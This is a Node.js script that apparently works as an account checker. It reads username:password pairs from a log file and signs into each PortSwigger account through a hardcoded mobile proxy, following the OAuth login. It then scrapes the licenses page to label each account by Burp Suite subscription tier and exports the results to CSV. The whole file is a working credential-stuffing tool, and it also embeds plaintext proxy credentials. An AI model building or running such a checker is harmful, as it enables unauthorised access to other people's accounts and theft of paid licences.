#!/usr/bin/env node

/**
 * Extract subscription plan from PortSwigger accounts
 *
 * Flow:
 * 1. Login with username:password
 * 2. Auto-save cookies during OAuth flow
 * 3. GET /users/youraccount/licenses with cookies
 * 4. Parse HTML for subscription status
 */

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
const DELAY = 100; // ms between requests

// Parse all accounts from log.txt
const logFile = fs.readFileSync('log.txt', 'utf-8');
const accounts = logFile.split('\n')
    .filter(l => l.trim() && !l.startsWith('#'))
    .map(l => {
        const [username, password] = l.trim().split(':').map(x => x.trim());
        return { username, password };
    });

console.log(`[*] Found ${accounts.length} accounts\n`);

function parseResponse(output) {
    const parts = output.split('\r\n\r\n');
    let headers = parts[0];
    let body = parts.slice(1).join('\r\n\r\n');

    // Handle proxy wrapping: actual HTTP response in body
    if (body && body.startsWith('HTTP/')) {
        const bodyParts = body.split('\r\n\r\n');
        headers = bodyParts[0];
        body = bodyParts.slice(1).join('\r\n\r\n');
    }

    const status = parseInt(headers.match(/HTTP\/\d\.\d (\d+)/)?.[1] || 0);
    const location = headers.match(/[Ll]ocation:\s*([^\r\n]+)/)?.[1]?.trim();
    return { status, body, location };
}

function curl(url, post = null, cookieJar = null) {
    try {
        let cmd;
        const cookieFlags = cookieJar ? `-b "${cookieJar}" -c "${cookieJar}"` : '';

        if (post) {
            const tempFile = path.join(os.tmpdir(), `data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);
            const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
            fs.writeFileSync(tempFile, data);
            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 -X POST -d @"${tempFile}" "${url}"`;
            try {
                const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
                fs.unlinkSync(tempFile);
                return parseResponse(output);
            } catch (e) {
                try { fs.unlinkSync(tempFile); } catch {}
                throw e;
            }
        } else {
            cmd = `curl -s -i ${cookieFlags} -x "${PROXY}" --connect-timeout 10 --max-time 20 "${url}"`;
            const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
            return parseResponse(output);
        }
    } catch (e) {
        return { status: 0, body: '', location: null };
    }
}

function sleep(ms) {
    const end = Date.now() + ms;
    while (Date.now() < end) {}
}

function extractPlan(html) {
    // Check for no subscriptions
    if (html.includes('You do not have any subscriptions')) {
        return 'Free';
    }

    // Look for subscription section and extract plan name from within it
    // Plans appear as subscription items with names like "Burp Suite Enterprise", etc.

    // Check for specific subscription names (order matters - Enterprise first as most restrictive)
    if (html.match(/burp\s+suite\s+enterprise/i) ||
        html.match(/subscription[^<]{0,200}enterprise/i) ||
        html.match(/active[^<]{0,100}enterprise[^<]{0,50}subscription/i)) {
        return 'Enterprise';
    }

    if (html.match(/burp\s+suite\s+team/i) ||
        html.match(/subscription[^<]{0,200}team/i) ||
        html.match(/active[^<]{0,100}team[^<]{0,50}subscription/i)) {
        return 'Team';
    }

    if (html.match(/burp\s+suite\s+professional/i) ||
        html.match(/subscription[^<]{0,200}professional/i) ||
        html.match(/active[^<]{0,100}professional[^<]{0,50}subscription/i)) {
        return 'Professional';
    }

    if (html.match(/burp\s+suite\s+community/i) ||
        html.match(/subscription[^<]{0,200}community/i) ||
        html.match(/active[^<]{0,100}community[^<]{0,50}subscription/i)) {
        return 'Community';
    }

    return 'Unknown';
}

function processAccount(account) {
    const cookieJar = path.join(os.tmpdir(), `ps_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);

    try {
        // Step 1: Get state from authorize endpoint
        let r = curl('https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query', null, cookieJar);

        let state = r.body.match(/state=([^&\s'"]+)/)?.[1] || '';
        if (!state) {
            throw new Error('Failed to extract state');
        }

        // Step 2: Login with credentials
        r = curl('https://login.portswigger.net/u/login', {
            username: account.username,
            password: account.password,
            action: 'default',
            state: state
        }, cookieJar);

        if (r.status !== 302) {
            throw new Error('Login failed');
        }

        // Step 3: Follow OAuth redirects (INCLUDING code exchange)
        let url = r.location;
        for (let i = 0; i < 10 && url; i++) {
            if (!url.startsWith('http')) url = 'https://login.portswigger.net' + url;
            r = curl(url, null, cookieJar);
            // After signin-oidc code exchange, we should have a redirect to portswigger.net
            if (r.location && r.location.includes('portswigger.net') && !r.location.includes('login')) {
                break;
            }
            url = r.location;
        }

        // Step 4: Fetch licenses page with established session cookies
        r = curl('https://portswigger.net/users/youraccount/licenses', null, cookieJar);

        // Step 5: If redirected to /users, follow it
        if (r.status === 302 && r.location?.includes('/users?returnurl')) {
            let usersUrl = r.location;
            if (!usersUrl.startsWith('http')) usersUrl = 'https://portswigger.net' + usersUrl;
            r = curl(usersUrl, null, cookieJar);
        }

        // Step 5: Extract plan from HTML
        const plan = extractPlan(r.body);

        // Clean up
        try { fs.unlinkSync(cookieJar); } catch {}

        return {
            username: account.username,
            plan: plan,
            status: 'OK'
        };

    } catch (error) {
        try { fs.unlinkSync(cookieJar); } catch {}
        return {
            username: account.username,
            plan: 'ERROR',
            status: error.message.substring(0, 50)
        };
    }
}

const results = [];
let processed = 0;
let failed = 0;

const startTime = Date.now();
for (let i = 0; i < accounts.length; i++) {
    const account = accounts[i];
    try {
        const result = processAccount(account);
        results.push(result);

        if (result.status === 'OK') {
            processed++;
            process.stdout.write(`\r[${i + 1}/${accounts.length}] ✓ ${account.username}: ${result.plan}`);
        } else {
            failed++;
            process.stdout.write(`\r[${i + 1}/${accounts.length}] ✗ ${account.username}: ${result.status}`);
        }
    } catch (e) {
        failed++;
        results.push({
            username: account.username,
            plan: 'ERROR',
            status: e.message.substring(0, 50)
        });
    }

    sleep(DELAY);
}

const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
console.log(`\n\n[✓] Done in ${totalTime}s: ${processed} OK, ${failed} Failed\n`);

// Export results
const timestamp = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
const csvFile = `subscriptions_${timestamp}.csv`;
const csv = [
    'Username,Plan,Status',
    ...results.map(r => `"${r.username.replace(/"/g, '""')}","${r.plan}","${r.status}"`)
].join('\n');
fs.writeFileSync(csvFile, csv);
console.log(`[✓] Exported: ${csvFile}`);

// Also save as latest
fs.writeFileSync('subscriptions.csv', csv);
console.log('[✓] Exported: subscriptions.csv\n');

// Summary
const byPlan = {};
results.forEach(r => {
    byPlan[r.plan] = (byPlan[r.plan] || 0) + 1;
});

console.log('='.repeat(50));
console.log('SUMMARY');
console.log('='.repeat(50));
Object.entries(byPlan).sort((a, b) => b[1] - a[1]).forEach(([plan, count]) => {
    const pct = ((count / results.length) * 100).toFixed(1);
    console.log(`${plan.padEnd(12)}: ${count.toString().padStart(3)} (${pct}%)`);
});
console.log('='.repeat(50));
